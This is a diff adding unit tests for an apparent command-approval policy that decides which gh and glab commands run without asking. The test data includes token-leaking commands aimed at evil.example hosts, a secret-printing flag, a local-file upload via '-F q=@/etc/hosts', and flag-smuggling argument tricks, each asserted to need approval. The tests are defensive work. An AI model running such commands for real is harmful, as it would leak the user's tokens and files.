@@ -487,6 +487,120 @@ class LocalWpCliTest(DecisionTest):
         self.assertDenies('localwp\tlist')
 
 
+class ForgeReadTest(DecisionTest):
+    """`gh` and `glab` auto-approve read-only subcommands, and only with flags on their lists."""
+
+    def test_reads_allowed(self):
+        for command in ('gh pr view 12', 'gh pr list --state open --json number,title',
+                        'gh pr diff 12 --name-only', 'gh issue view 5 --comments',
+                        'gh run view 99 --log-failed', 'gh search prs --author @me',
+                        'gh auth status', 'gh --version', 'glab mr view 3 -F json',
+                        'glab mr list --author me', 'glab ci list', 'glab --version',
+                        '/opt/homebrew/bin/gh pr view 12', 'gh pr view --help'):
+            with self.subTest(command=command):
+                self.assertAllows(command)
+
+    def test_writes_ask(self):
+        for command in ('gh pr merge 12', 'gh pr create --fill', 'gh release create v1',
+                        'gh workflow run build.yml', 'gh pr checkout 12', 'gh repo clone a/b',
+                        'gh run download 99', 'glab mr merge 3', 'glab mr approve 3',
+                        'glab mr create', 'glab ci status', 'gh', 'gh some-extension'):
+            with self.subTest(command=command):
+                self.assertAsks(command)
+
+    def test_repo_flag_allowed_anywhere(self):
+        self.assertAllows('gh pr -R a/b view 12')
+        self.assertAllows('gh -R a/b pr list')
+        self.assertAllows('gh pr view 12 --repo=a/b')
+        self.assertAllows('glab mr view 3 -R group/sub/repo')
+        self.assertAsks('gh pr -R a/b merge 12')
+
+    def test_flags_off_the_list_ask(self):
+        """`--web` opens a browser, `--show-token` prints a secret, and `--watch` never exits."""
+        for command in ('gh pr view 12 --web', 'gh pr view 12 -w', 'gh auth status -t',
+                        'gh auth status --show-token', 'gh pr checks 12 --watch',
+                        'glab mr view 3 --web', 'glab auth status -t',
+                        'glab ci get --with-variables', 'gh pr list -L5'):
+            with self.subTest(command=command):
+                self.assertAsks(command)
+
+    def test_repo_value_must_be_a_plain_path(self):
+        """A host in the value would send the request, and that host's token, elsewhere."""
+        for command in ('gh pr list -R evil.example/a/b',
+                        'glab mr list -R https://evil.example/g/r',
+                        'glab mr list -R git@evil.example:g/r', 'gh pr list --repo=x.test/a/b',
+                        'gh repo view evil.example/a/b', 'glab repo view evil.example/g/r',
+                        'gh pr view https://evil.example/a/b/pull/1'):
+            with self.subTest(command=command):
+                self.assertAsks(command)
+        self.assertAllows('gh repo view a/b')
+        self.assertAllows('glab repo view group/sub/repo')
+
+    def test_repo_flag_as_another_flags_value_cannot_hide_a_flag(self):
+        """pflag reads `--branch -R --web` as a branch named `-R`, leaving `--web` live."""
+        self.assertAsks('glab ci get --pipeline-id 123 --branch -R --with-variables')
+        self.assertAsks('gh pr list --label -R --web')
+
+    def test_combined_short_flags_ask(self):
+        """`-cw` is `-c -w` to pflag, and `-w` opens a browser."""
+        self.assertAsks('gh pr view 1 -cw')
+
+    def test_cd_into_a_directory_named_like_a_covered_command_is_left_alone(self):
+        self.assertSilent('cd /Users/x/src/gh')
+
+    def test_short_flag_means_what_its_subcommand_says(self):
+        """`-w` is `--workflow` on `run list` but `--web` on `pr view`."""
+        self.assertAllows('gh run list -w build.yml')
+
+    def test_flags_after_double_dash_are_operands(self):
+        self.assertAllows('gh pr view -- --web')
+
+    def test_double_dash_as_a_flags_value_does_not_end_the_flags(self):
+        """pflag gives `--search` the value `--`, so `--web` after it is still a live flag."""
+        for command in ('gh pr list --search -- --web', 'gh search prs --author -- --web',
+                        'glab ci get -F -- --with-variables', 'glab mr view 3 -F -- --web'):
+            with self.subTest(command=command):
+                self.assertAsks(command)
+
+
+class ForgeApiTest(DecisionTest):
+    """`gh api` and `glab api` pass only as a GET to a REST path."""
+
+    def test_get_allowed(self):
+        for command in ('gh api repos/a/b/pulls', "gh api '/repos/{owner}/{repo}/pulls?per_page=5'",
+                        'gh api -X GET search/issues -f q=bug', 'gh api user --jq .login',
+                        'gh api repos/a/b/pulls --paginate',
+                        "gh api -H 'Accept: application/vnd.github.diff' repos/a/b/pulls/1",
+                        'glab api projects/1/merge_requests', 'gh api --method=GET user',
+                        'glab api projects/:id/merge_requests'):
+            with self.subTest(command=command):
+                self.assertAllows(command)
+
+    def test_writes_ask(self):
+        for command in ('gh api -X PUT repos/a/b/contents/x', 'gh api repos/a/b/issues -f title=x',
+                        'gh api repos/a/b/issues --raw-field title=x', 'gh api -XPOST user',
+                        'gh api repos/a/b/issues -F title=x', 'gh api -X GET user -F q=@/etc/hosts',
+                        'gh api repos/a/b/issues --input body.json', 'gh api -X get user',
+                        'glab api -X DELETE projects/1', 'glab api projects/1/issues -f title=x',
+                        "gh api -H 'X-HTTP-Method-Override: DELETE' user"):
+            with self.subTest(command=command):
+                self.assertAsks(command)
+
+    def test_graphql_asks(self):
+        self.assertAsks("gh api graphql -f query='query { viewer { login } }'")
+        self.assertAsks('glab api graphql -f query=x')
+        self.assertAsks('gh api /GraphQL')
+
+    def test_unusual_endpoints_and_flags_ask(self):
+        for command in ('gh api https://example.test/x', 'gh api //example.test/x',
+                        'glab api projects/x:y', 'gh api', 'gh api user extra',
+                        'gh api user --verbose', 'gh api -R a/b user', 'gh api -iq user',
+                        'gh api --hostname example.test user',
+                        'glab api --hostname example.test projects'):
+            with self.subTest(command=command):
+                self.assertAsks(command)
+
+
 class McpInputTest(DecisionTest):
     """The Local WP MCP server passes bare WP-CLI arguments with no `wp` and a leading `--url=`."""
 
